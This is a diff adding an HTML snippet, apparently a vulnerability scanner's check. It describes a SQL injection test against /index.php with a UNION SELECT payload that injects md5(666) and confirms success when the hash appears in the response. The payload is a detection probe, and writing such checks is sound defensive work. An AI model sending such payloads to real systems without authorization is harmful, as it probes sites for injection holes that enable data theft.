@@ -1,0 +1,12 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入 URL: </h3>
+    <ul>
+        <p>/index.php</p>
+    </ul>
+    <h3>GET-payload: </h3>
+        <code>?ID=1 UNION SELECT 1,md5(666),3,4,5,6,7,8--</code>
+    <h3>验证过程</h3>
+    <p>构造GET请求</p>
+    <p>查找response text 是否含有"666"的md5值 "fae0b27c451c728867a567e8c1bb4e53"</p>
+</div>
